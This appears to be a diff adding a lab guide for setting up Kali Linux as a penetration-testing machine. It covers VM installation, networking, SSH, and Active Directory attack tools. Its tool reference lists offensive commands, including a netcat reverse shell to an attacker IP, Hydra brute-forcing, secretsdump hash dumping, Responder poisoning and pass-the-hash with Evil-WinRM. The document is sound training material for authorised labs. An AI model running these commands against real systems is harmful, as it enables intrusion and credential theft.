@@ -1,0 +1,650 @@
+# Kali Linux Setup & Configuration
+
+**Full Procedure:** Installation → Post-Config → Tools Verification → Lab Network Integration → Penetration Testing Readiness
+**Platform:** VMware / VirtualBox
+
+## 1. Overview
+
+### 1.1 Objective
+
+Install and fully configure Kali Linux as a dedicated penetration testing machine inside a virtual environment. This lab covers the complete setup process — from VM creation and OS installation through post-installation configuration, tool verification, network integration into the lab environment, and preparation for active security testing exercises including network reconnaissance, vulnerability scanning, and exploitation.
+
+### 1.2 What This Lab Covers
+
+- Creating and configuring a Kali Linux virtual machine with optimal settings
+- Installing Kali Linux from ISO using the graphical installer
+- Post-installation system update and package management
+- Network configuration for lab environment integration
+- SSH server setup and remote access configuration
+- Verification of pre-installed penetration testing tools
+- Installing additional tools: Impacket, CrackMapExec
+- Configuring Kali for Active Directory attack exercises
+- Setting up wordlists and attack resources (rockyou.txt, SecLists)
+- Snapshot management for lab rollback capability
+
+### 1.3 What is Kali Linux?
+
+**About Kali Linux**
+
+- **Developer:** Offensive Security (OffSec) — the same organisation behind the OSCP certification
+- **Base:** Debian Linux — inherits Debian's package management (APT) and stability
+- **Purpose:** Built specifically for penetration testing, digital forensics, and security research
+- **Pre-installed tools:** 600+ security tools including Nmap, Metasploit, Wireshark, Hydra, Burp Suite, Aircrack-ng, and many more
+- **Updates:** Rolling release model — tools are always up to date with latest security research
+- **Usage:** Used by penetration testers, red teams, CTF players, security researchers, and students worldwide
+
+**Important:** Kali Linux is a professional tool. All techniques covered in this lab must only be used in authorised lab environments — never on systems you do not own or have explicit written permission to test.
+
+### 1.4 Prerequisites
+
+Before Starting This Lab
+
+- **Lab environment:** Windows Server 2022 domain controller (Lab 1) should already be running for AD attack exercises
+- **Kali Linux ISO:** Download from kali.org/get-kali — choose Installer (not Live) — 64-bit
+- **Virtualisation software:** VMware Workstation, VMware Player, or VirtualBox (free)
+- **Minimum VM resources:** 4 GB RAM, 80 GB disk, 2 vCPU — more RAM and disk recommended for running multiple tools simultaneously
+- **Network:** Kali must be on the same isolated internal network as all other lab VMs
+- **Alternative:** VMware/VirtualBox also offer a pre-built Kali VM at kali.org/get-kali/#kali-virtual-machines — skip straight to Step 4 if using this
+
+---
+
+## 2. Lab Environment
+
+| Component | Specification | Notes |
+|-----------|---------------|-------|
+| VM Platform | VMware Workstation / VirtualBox | Any recent version |
+| OS | Kali Linux (latest stable) | Download ISO from kali.org — always use latest |
+| RAM | 4 GB minimum (8 GB recommended) | Metasploit and multiple tools need RAM |
+| Storage | 80 GB virtual disk | Tools and wordlists take significant space |
+| CPU | 2 vCPUs minimum (4 recommended) | Password cracking benefits from more cores |
+| Network Adapter | Internal/Host-Only | Same isolated network as all other lab VMs |
+| Role in Lab | Attack Machine | Used to test all other VMs in the lab |
+| Display | XFCE desktop environment (default) | Lightweight and fast — ideal for a VM |
+
+### Kali Linux VM vs Pre-Built VM
+
+- **Install from ISO (this lab):** Full control over partitioning, username, and configuration. Best for learning the installation process.
+- **Pre-built VM (kali.org/get-kali):** Ready to use in minutes — import into VMware or VirtualBox. Best for getting started quickly. Default credentials are kali/kali — change immediately.
+- **Kali on WSL2 (Windows Subsystem for Linux):** Available from Microsoft Store — useful for quick command-line access but limited for GUI tools and network scanning.
+
+**Recommendation:** Install from ISO at least once to understand the process. Use the pre-built VM for day-to-day lab work afterward.
+
+---
+
+## 3. Kali Linux Installation — Step by Step
+
+### Step 01: Create the Virtual Machine
+
+1. Open VMware Workstation or VirtualBox → click Create a New Virtual Machine / New
+2. Select the Kali Linux ISO as the installer disc image
+3. Set operating system: Linux → Debian 11.x / 12.x 64-bit (Kali is Debian-based)
+4. Name the virtual machine: `Kali-Linux-AttackMachine` → choose storage location
+5. Set virtual disk size: 80 GB → Store virtual disk as a single file
+6. Click Customize Hardware before finishing:
+   - **Memory:** 4096 MB minimum — 8192 MB recommended
+   - **Processors:** 2 vCPUs minimum — 4 recommended for password cracking
+   - **Network Adapter:** set to the same internal/isolated network as all other lab VMs
+   - **No TPM required** — Kali Linux does not need TPM 2.0
+   - **Enable 3D graphics acceleration** if available — improves desktop performance
+7. Click Finish → Power On the virtual machine
+
+**VM Specification Reference**
+RAM : 4 GB minimum — 8 GB for comfortable multi-tool usage vCPU : 2 minimum — 4 recommended (hashcat/john benefit from more cores) Disk : 80 GB — wordlists alone can exceed 10 GB Network : Internal — same isolated network as domain controller and targets TPM : NOT required GPU : Enable 3D acceleration for better XFCE desktop performance
+
+Code
+
+### Step 02: Boot and Select Installation Type
+
+8. When the VM powers on — the Kali Linux GRUB boot menu appears
+9. Select **Graphical Install** (recommended for first-time setup) → press Enter
+   - **Graphical Install:** full GUI installer — easier and more visual
+   - **Install:** text-based installer — faster but no mouse support
+   - **Live:** boots into Kali without installing — changes are not saved
+10. The Kali Linux graphical installer loads
+
+**Boot Menu Options**
+Graphical Install → GUI installer with mouse support ✓ RECOMMENDED Install → Text-based installer (keyboard only) Live (amd64) → Boots without installing — no persistence Live (forensics) → Forensics mode — does not auto-mount drives Advanced options → Expert install, rescue mode, etc.
+
+Code
+
+### Step 03: Language, Location, and Keyboard
+
+11. Select your Language → click Continue
+12. Select your Location (this sets the timezone) → click Continue
+13. Select your Keyboard layout → click Continue
+14. The installer performs hardware detection and configures the network
+
+### Step 04: Configure the Network
+
+15. **Hostname:** enter a descriptive name for your Kali machine (e.g `kali-attack` or `pentest-01`) → click Continue
+    - This is how the machine identifies itself on the network
+    - Use a name relevant to its role — avoid 'kali' by default to be less obvious in real engagements
+16. **Domain name:** leave blank for a standalone machine, or enter your lab domain if joining → click Continue
+
+### Step 05: Create User Account
+
+Unlike Windows, Kali Linux uses a standard non-root user by default for daily operations. Root access is obtained via `sudo`.
+
+17. **Full name:** enter your full name or a lab identifier → click Continue
+18. **Username:** enter a username (lowercase, no spaces — e.g `harrisonkali` or `pentester`) → click Continue
+19. **Password:** set a strong password → confirm → click Continue
+
+**Kali Linux User Account Best Practices**
+
+- **Default user (non-root):** Kali 2020+ creates a regular user by default — root access via `sudo`. This is more secure than running everything as root.
+- **Root account:** The root account exists but is not used for daily tasks. Access via: `sudo su` or `sudo -i`
+- **Password strength:** Use a strong password — your Kali machine is your most powerful lab tool. If someone gains access to it, they gain access to all your attack tools and network position.
+- **SSH keys:** After installation, set up SSH key authentication to replace password login for SSH sessions — covered in Step 8.
+
+### Step 06: Partition the Disk
+
+20. **Partitioning method:** select Guided — use entire disk for a VM (simplest option) → click Continue
+21. Select the virtual disk shown → click Continue
+22. **Partitioning scheme:** select All files in one partition (recommended for new users) → click Continue
+23. Click Finish partitioning and write changes to disk → click Continue
+24. **Confirm:** select Yes to write changes → click Continue
+25. The base system installation begins — this takes 5–15 minutes
+
+**Partition Scheme Reference**
+All files in one partition → Single root (/) partition ✓ RECOMMENDED for VMs Separate /home partition → /home on separate partition (easier to reinstall OS) Separate /home, /var, /tmp → Enterprise layout — limits log/tmp disk attacks
+
+For a lab VM — single partition is simplest and sufficient For a production pentesting machine — separate /home is recommended
+
+Code
+
+### Step 07: Configure the Package Manager and Select Software
+
+26. **Network mirror:** select Yes to use a network mirror for package updates → click Continue
+27. **HTTP proxy:** leave blank (unless your network requires one) → click Continue
+28. Software selection screen appears — this determines which tools are pre-installed:
+
+| Kali Metapackage | Tools Included | Disk Space | Recommended For |
+|------------------|----------------|------------|-----------------|
+| kali-linux-default | Top 20 most-used tools (Nmap, Metasploit, Burp, Wireshark, Hydra, etc.) | ~8 GB | Most users — this lab |
+| kali-linux-large | Extended toolset — ~200 tools | ~15 GB | Active pentesters |
+| kali-linux-everything | All 600+ tools | ~50 GB | Full toolset — needs large disk |
+| kali-linux-headless | No GUI — CLI only | ~3 GB | Servers and CI/CD pipelines |
+
+29. Select **kali-linux-default** for this lab → also ensure the desktop environment (XFCE is the lightest) is selected → click Continue
+30. Installation proceeds — downloading and installing packages takes 15–40 minutes depending on internet speed
+
+### Step 08: Install GRUB Bootloader and Complete Installation
+
+31. **Install GRUB bootloader** to primary drive: select Yes → click Continue
+32. Select the virtual disk (e.g `/dev/sda`) → click Continue
+33. Installation completes → click Continue to reboot
+34. Remove the ISO from the virtual CD/DVD drive before the VM reboots — or the installer will boot again
+    - In VMware: `VM → Settings → CD/DVD → uncheck Connected`
+    - In VirtualBox: `Devices → Optical Drives → Remove disk from virtual drive`
+35. Kali Linux boots to the login screen → log in with your username and password
+
+### Step 09: Post-Installation — First Boot Configuration
+
+After first login, complete these essential configuration steps before doing anything else in the lab.
+
+#### 9a — Update the System Fully
+
+Kali uses a rolling release model — always update immediately after installation to get the latest tool versions and security patches.
+
+**System Update Commands**
+```bash
+# Open terminal and run full system update:
+sudo apt update && sudo apt full-upgrade -y
+
+# After update completes, reboot:
+sudo reboot
+
+# After reboot — verify kernel version:
+uname -r
+
+# Check Kali version:
+cat /etc/os-release
+9b — Install VMware Tools or VirtualBox Guest Additions
+Guest additions enable clipboard sharing, drag-and-drop, auto-resize display, and better performance inside the VM.
+
+Guest Additions Installation
+
+bash
+# For VMware — install open-vm-tools:
+sudo apt install open-vm-tools-desktop -y
+sudo reboot
+
+# For VirtualBox — install Guest Additions:
+sudo apt install virtualbox-guest-x11 -y
+sudo reboot
+
+# Verify VMware tools are running:
+systemctl status open-vm-tools
+9c — Set the Correct Timezone
+Timezone Configuration
+
+bash
+# Check current timezone:
+timedatectl
+
+# Set timezone (replace with your region):
+
+# Verify:
+date
+9d — Configure the Hostname
+Hostname Configuration
+
+bash
+# Check current hostname:
+hostname
+
+# Change hostname permanently:
+sudo hostnamectl set-hostname kali-attack
+
+# Update /etc/hosts to match:
+sudo nano /etc/hosts
+# Change the line:   old-hostname
+# To:                kali-attack
+
+# Verify:
+hostname && cat /etc/hosts
+9e — Change Default Passwords
+Password Configuration
+
+bash
+# Change your user password (best practice after first login):
+passwd
+
+# Change root password:
+sudo passwd root
+
+# Verify current user:
+whoami && id
+Step 10: Configure Network for Lab Environment
+Configure Kali's network adapter to communicate with all other machines in your isolated lab network.
+
+10a — Check Current Network Configuration
+Network Verification Commands
+
+bash
+# View all network interfaces and IP addresses:
+ip addr show
+# or shorter:
+ip a
+
+# View routing table:
+ip route show
+
+# Check DNS configuration:
+cat /etc/resolv.conf
+
+# Test connectivity to domain controller:
+ping -c 4 <DC-IP-Address>
+10b — Configure Static IP (Optional but Recommended for Lab)
+A static IP makes it easier to reference your attack machine in commands and scripts throughout the lab.
+
+Static IP Configuration
+
+bash
+# Method 1 — Using NetworkManager (GUI):
+# Right-click network icon in taskbar → Edit Connections
+# Select your adapter → Edit → IPv4 Settings
+# Method: Manual → Add your static IP, netmask, gateway
+# DNS: set to your Domain Controller IP
+
+# Method 2 — Using nmcli (command line):
+# List connections:
+nmcli connection show
+
+# Set static IP:
+sudo nmcli connection modify 'Wired connection 1' \
+    ipv4.method manual \
+    ipv4.addresses '192.168.x.x/24' \
+    ipv4.gateway '192.168.x.1' \
+    ipv4.dns '<DC-IP-Address>'
+
+# Activate the changes:
+sudo nmcli connection up 'Wired connection 1'
+
+# Verify:
+ip addr show && ip route show
+10c — Test Lab Network Connectivity
+Lab Network Connectivity Tests
+
+bash
+# Test connectivity to each lab machine:
+ping -c 2 <Domain-Controller-IP>
+ping -c 2 <Windows-11-Workstation-IP>
+ping -c 2 <Windows-Server-2019-IP>
+
+# Test DNS resolution (if Kali DNS points to DC):
+nslookup yourdomain.local
+host yourdomain.local
+
+# Quick scan to discover all live hosts on the subnet:
+nmap -sn 192.168.x.0/24
+# Lists all machines responding to ping on the lab network
+Step 11: Enable and Configure SSH Server
+SSH allows you to connect to Kali remotely from other machines — useful for running commands and transferring files during lab exercises.
+
+SSH Server Configuration
+
+bash
+# Check SSH service status:
+sudo systemctl status ssh
+
+# Enable SSH to start automatically on boot:
+sudo systemctl enable ssh
+
+# Start SSH now:
+sudo systemctl start ssh
+
+# Verify SSH is running and listening on port 22:
+ss -tlnp | grep :22
+# Should show: LISTEN  0  128  0.0.0.0:22
+
+# Find Kali's IP for SSH connections from other machines:
+hostname -I
+
+# Test SSH from another machine (e.g Windows PowerShell):
+ssh username@<kali-IP>
+
+# Generate SSH key pair (run on the machine you connect FROM):
+ssh-keygen -t ed25519 -C 'lab-key'
+
+# Copy public key to Kali for passwordless login:
+ssh-copy-id username@<kali-IP>
+SSH Security Hardening for Lab
+
+Disable root login: Edit /etc/ssh/sshd_config → set PermitRootLogin no
+Change default port (optional): Set Port 2222 instead of 22 — reduces automated scanning noise
+Use SSH keys: Disable password authentication after setting up key auth — set PasswordAuthentication no
+Restart SSH after changes: sudo systemctl restart ssh
+Step 12: Verify Pre-Installed Penetration Testing Tools
+Kali comes with hundreds of pre-installed tools. Verify the key ones are working correctly.
+
+Tool	Category	Verify Command	Purpose in Lab
+Nmap	Network Scanner	nmap --version	Port scanning and service detection
+Metasploit	Exploitation Framework	msfconsole --version	Exploit development and delivery
+Wireshark	Packet Analyser	wireshark --version	Network traffic capture and analysis
+Hydra	Brute-Force Tool	hydra --version	Credential brute-forcing (SSH, SQL, HTTP)
+John the Ripper	Password Cracker	john --version	Offline password hash cracking
+Hashcat	GPU Password Cracker	hashcat --version	Fast GPU-accelerated hash cracking
+Burp Suite	Web Proxy	burpsuite	Web application security testing
+Nikto	Web Scanner	nikto -Version	Web server vulnerability scanning
+SQLmap	SQL Injection	sqlmap --version	Automated SQL injection detection
+Gobuster	Directory Brute-Force	gobuster --version	Web directory and DNS enumeration
+Netcat	Network Utility	nc -h	Reverse shells, port listening, file transfer
+Tool Verification Script
+
+bash
+# Quick tool verification script — run all at once:
+tools=(nmap hydra john hashcat sqlmap gobuster netcat nikto)
+for tool in ${tools[@]}; do
+    if command -v $tool &> /dev/null; then
+        echo '[OK]  '$tool' — '$($tool --version 2>&1 | head -1)
+    else
+        echo '[MISSING] '$tool
+    fi
+done
+
+# Check Metasploit:
+msfconsole --version
+
+# Update Metasploit database:
+sudo msfdb init
+sudo msfdb start
+Step 13: Install Additional Tools for the Lab
+Install tools not included in the default Kali package that are required for specific lab exercises.
+
+13a — Install Impacket (Active Directory Attack Tools)
+Impacket Installation
+
+bash
+# Impacket provides Python tools for AD attacks:
+# GetNPUsers.py (AS-REP Roasting), secretsdump.py, psexec.py, etc.
+
+# Install via pip (Python package manager):
+sudo pip3 install impacket
+
+# Or install from GitHub for latest version:
+git clone https://github.com/fortra/impacket.git
+cd impacket
+sudo pip3 install .
+
+# Verify installation:
+python3 -c 'import impacket; print(impacket.__version__)'
+
+# Test a specific tool:
+GetNPUsers.py --help
+secretsdump.py --help
+13b — Install CrackMapExec (CME)
+CrackMapExec Installation
+
+bash
+# CrackMapExec — Active Directory Swiss army knife
+# Used for: credential testing, SMB enumeration, lateral movement
+
+sudo apt install crackmapexec -y
+
+# Or via pip:
+sudo pip3 install crackmapexec
+
+# Verify:
+crackmapexec --version
+cme --version
+
+# Basic usage — test SMB connectivity across subnet:
+crackmapexec smb 192.168.x.0/24
+13c — Download Wordlists and Attack Resources
+Wordlists and Resources Setup
+
+bash
+# rockyou.txt — the most common password wordlist (included in Kali):
+ls /usr/share/wordlists/
+
+# Uncompress rockyou.txt if not already done:
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Verify rockyou.txt is ready:
+wc -l /usr/share/wordlists/rockyou.txt
+# Should show: 14344391 (14+ million passwords)
+
+# Install SecLists — comprehensive collection of security wordlists:
+sudo apt install seclists -y
+
+# SecLists location:
+ls /usr/share/seclists/
+# Contains: usernames, passwords, web fuzzing, discovery lists
+
+# Create a custom directory for lab wordlists:
+mkdir -p ~/wordlists
+cp /usr/share/wordlists/rockyou.txt ~/wordlists/
+Step 14: Configure Kali for Active Directory Attack Exercises
+Set up Kali specifically for attacking Active Directory environments — the core of enterprise penetration testing.
+
+14a — Configure /etc/hosts for Lab Machines
+Hosts File Configuration
+
+bash
+# Add lab machine hostnames to /etc/hosts for easy reference:
+sudo nano /etc/hosts
+
+# Add lines like these (replace with your actual IPs):
+# 192.168.x.10   dc01.yourdomain.local   dc01
+# 192.168.x.20   workstation01           ws01
+# 192.168.x.30   dbserver01              db01
+
+# Test hostname resolution:
+ping -c 2 dc01
+ping -c 2 workstation01
+14b — Install and Configure Responder
+Responder Configuration
+
+bash
+# Responder — LLMNR/NBT-NS/mDNS poisoner
+# Captures NTLM hashes from misconfigured Windows machines
+
+# Responder is pre-installed in Kali — verify:
+which responder
+responder --help
+
+# Basic Responder usage (replace eth0 with your interface):
+sudo responder -I eth0 -rdwv
+
+# Captured hashes are saved to:
+ls /usr/share/responder/logs/
+14c — Install BloodHound and Neo4j (AD Mapper)
+BloodHound Setup
+
+bash
+# BloodHound — graphically maps AD attack paths
+# Shows paths from low-privilege user to Domain Admin
+
+# Install BloodHound and Neo4j:
+sudo apt install bloodhound neo4j -y
+
+# Start Neo4j database:
+sudo neo4j start
+
+# On first run — set Neo4j password:
+# Open browser → http://localhost:7474
+# Login: neo4j / neo4j → set new password
+
+# Start BloodHound:
+bloodhound &
+
+# Install SharpHound (data collector) on Windows machines:
+# Available at: github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+14d — Configure Evil-WinRM (Remote Windows Management)
+Evil-WinRM Installation
+
+bash
+# Evil-WinRM — WinRM shell for penetration testing
+# Connects to Windows machines via WinRM (port 5985/5986)
+
+# Install:
+sudo gem install evil-winrm
+
+# Verify:
+evil-winrm --version
+
+# Basic usage:
+evil-winrm -i <target-IP> -u <username> -p <password>
+
+# With hash (Pass-the-Hash):
+evil-winrm -i <target-IP> -u <username> -H <NTLM-hash>
+Step 15: Take a Snapshot — Lab Baseline
+Before starting any lab exercises, take a VM snapshot. This allows you to restore Kali to a clean state at any time — essential for a lab environment.
+
+Snapshot Management
+
+bash
+# In VMware — take snapshot from the menu:
+# VM → Snapshot → Take Snapshot
+# Name: 'Kali-Clean-Baseline'
+# Description: 'Post-install, fully updated, all tools verified'
+
+# In VirtualBox — take snapshot:
+# Machine → Take Snapshot
+# Name: 'Kali-Clean-Baseline'
+
+# From command line (VMware):
+# vmrun snapshot /path/to/kali.vmx 'Kali-Clean-Baseline'
+
+# When to take snapshots:
+# - After fresh installation and configuration  ← do this now
+# - Before testing any new exploit or technique
+# - After completing each lab successfully
+
+# Restoring a snapshot:
+# VMware: VM → Snapshot → Snapshot Manager → select → Restore
+# VirtualBox: Machine → Restore Snapshot
+Why Snapshots Are Essential in a Security Lab
+
+Mistakes happen: Misconfigurations, bad payloads, or accidental file deletion can break your attack machine. Snapshots let you recover in seconds.
+Clean state for each exercise: Some exercises modify system state — snapshots let you start fresh for each test.
+Compare before/after: Snapshots let you see exactly what changed during an attack — valuable for learning.
+Multiple configurations: Maintain snapshots for different lab configurations — one with BloodHound running, one clean, one with specific tools configured.
+4. Essential Kali Linux Tools Reference
+Quick reference for the tools used throughout all lab exercises:
+
+4.1 Reconnaissance & Scanning
+Tool	Command	Purpose
+Nmap — Host Discovery	nmap -sn 192.168.x.0/24	Find all live hosts on the subnet
+Nmap — Port Scan	nmap -sV -sC -p- <target>	Full port scan with service detection
+Nmap — OS Detection	nmap -O <target>	Detect operating system
+Nmap — Script Scan	nmap --script smb-enum-shares <target>	Run specific NSE scripts
+Netdiscover	sudo netdiscover -r 192.168.x.0/24	ARP-based host discovery
+Enum4linux	enum4linux -a <target>	SMB/NetBIOS enumeration (Windows targets)
+4.2 Active Directory Attacks
+Tool	Command	Purpose
+GetNPUsers.py	GetNPUsers.py DOMAIN/ -no-pass -dc-ip <DC>	AS-REP Roasting — capture hashes without credentials
+GetSPNUsers.py	GetSPNUsers.py DOMAIN/user -dc-ip <DC>	Kerberoasting — capture service ticket hashes
+secretsdump.py	secretsdump.py DOMAIN/admin@<DC>	Dump NTLM hashes from domain controller
+BloodHound	bloodhound-python -d DOMAIN -u user -p pass	Collect AD data for attack path mapping
+CrackMapExec	cme smb 192.168.x.0/24 -u user -p pass	Test credentials across entire subnet
+Responder	sudo responder -I eth0 -rdwv	Capture NTLM hashes via LLMNR poisoning
+4.3 Credential Attacks
+Tool	Command	Purpose
+Hydra — SSH	hydra -l user -P rockyou.txt ssh://<target>	Brute-force SSH login
+Hydra — SQL	hydra -l sa -P rockyou.txt <target> mssql	Brute-force SQL Server (port 1433)
+Hydra — RDP	hydra -l admin -P rockyou.txt rdp://<target>	Brute-force Remote Desktop
+John	john --wordlist=rockyou.txt hashes.txt	Offline hash cracking with wordlist
+Hashcat	hashcat -m 1000 hashes.txt rockyou.txt	GPU-accelerated NTLM hash cracking
+Hashcat — AS-REP	hashcat -m 18200 asrep.txt rockyou.txt	Crack AS-REP Roasting hashes
+4.4 Exploitation & Post-Exploitation
+Tool	Command	Purpose
+Metasploit	msfconsole	Full exploitation framework
+SQLmap	sqlmap -u 'http://target/page?id=1' --dbs	Automated SQL injection
+Evil-WinRM	evil-winrm -i <target> -u user -p pass	WinRM remote shell
+Netcat — listener	nc -lvnp 4444	Listen for reverse shell connections
+Netcat — connect	nc <attacker-IP> 4444 -e /bin/bash	Send reverse shell
+TCPdump	sudo tcpdump -i eth0 -w capture.pcap	Capture network traffic to file
+Wireshark	wireshark	GUI packet analysis
+5. Security Observations
+Key Security Insights from Setting Up Kali
+
+Kali is only as powerful as the operator: Having 600+ tools installed means nothing without understanding how and when to use each one. Technique knowledge always outweighs tool count.
+
+Your attack machine is a high-value target: Kali contains your tools, wordlists, captured credentials, and attack scripts. Protect it — use strong passwords, SSH keys, and keep it on an isolated network.
+
+Tool updates matter: Vulnerabilities are discovered and exploited quickly. Using an outdated Metasploit or Nmap version means missing critical exploits and detections. Always update before engagements: sudo apt update && sudo apt full-upgrade
+
+Snapshots enable disciplined testing: Professional penetration testers document every action and test from a known state. Snapshot discipline mimics this professional workflow.
+
+BloodHound changed AD pentesting: Before BloodHound, finding domain admin attack paths took hours of manual work. BloodHound maps the entire domain graphically in seconds — it fundamentally changed how AD environments are assessed.
+
+Responder is passive but powerful: LLMNR poisoning via Responder requires no credentials and no exploitation — just being on the network. It captures NTLM hashes from any Windows machine that makes a failed name resolution request. This is why network segmentation matters.
+
+6. Troubleshooting Guide
+Problem	Likely Cause	Solution
+Kali boots back to installer after install	ISO still connected to VM	Remove ISO from CD/DVD before reboot: VM Settings → CD/DVD → uncheck Connected
+Cannot connect to lab machines (ping fails)	Wrong virtual network adapter	Ensure Kali's network adapter is on the same internal network as all other lab VMs
+apt update fails — cannot reach mirrors	No internet access from isolated VM	Add a second network adapter for internet (NAT) for updates, keep internal adapter for lab
+Metasploit database error on start	PostgreSQL not running	Run: sudo msfdb init then sudo msfdb start
+BloodHound cannot connect to Neo4j	Neo4j not running or wrong password	Run: sudo neo4j start. Reset password at http://localhost:7474
+Impacket tools not found after install	pip install in wrong Python env	Use: sudo pip3 install impacket or install from GitHub with sudo python3 setup.py install
+SSH connection refused from other machines	SSH service not running	Run: sudo systemctl start ssh && sudo systemctl enable ssh
+Display resolution wrong in VM	Guest additions not installed	Install: sudo apt install open-vm-tools-desktop -y (VMware) or virtualbox-guest-x11 (VBox)
+7. Skills Demonstrated
+Skill	Demonstrated By
+Linux Installation	Full Kali Linux install from ISO — partitioning, user setup, package selection
+Linux System Administration	System updates, hostname config, timezone, SSH server management
+Network Configuration on Linux	Static IP setup, DNS config, /etc/hosts management via nmcli and NetworkManager
+Package Management (APT)	apt install, apt update, pip3 install — managing both system and Python packages
+Penetration Testing Tool Setup	Installing and configuring Impacket, CrackMapExec, BloodHound, Responder for AD attack exercises
+SSH Configuration	Enabling SSH server, key-based authentication, hardening SSH for lab use
+Active Directory Attack Tools	Configuring Impacket, BloodHound, Evil-WinRM, Responder for AD attack exercises
+VM Snapshot Management	Taking and restoring VM snapshots for disciplined lab state management
+Wordlist and Resource Management	Setting up rockyou.txt, SecLists, and lab-specific attack resources
+Security Tool Awareness	Understanding 10+ penetration testing tools — their purpose, usage, and detection signatures
+8. Key Learning Outcomes
+How Kali Linux differs from standard Linux distributions — its rolling release model, purpose-built tool ecosystem, and why it is the industry standard for penetration testing
+
+The full Linux OS installation process — partition management, user account creation, bootloader setup, and the significance of each step
+
+How Linux networking works — interfaces, IP configuration via nmcli, /etc/hosts, DNS resolution, and how these differ from Windows networking
+
+Why system updates are critical on a penetration testing machine — outdated tools miss new exploits, and adversaries update their techniques faster than vendors patch
+
+The role of each major tool category: reconnaissance (Nmap), credential attacks (Hydra, John, Hashcat), AD attacks (Impacket, BloodHound, Responder), exploitation (Metasploit), and post-exploitation (Evil-WinRM, CrackMapExec)
+
+Why BloodHound fundamentally changed Active Directory penetration testing — graphical attack path mapping replaced days of manual enumeration
+
+The professional discipline of snapshot management — testing from a known state, documenting tool configurations, and maintaining a clean lab baselINE
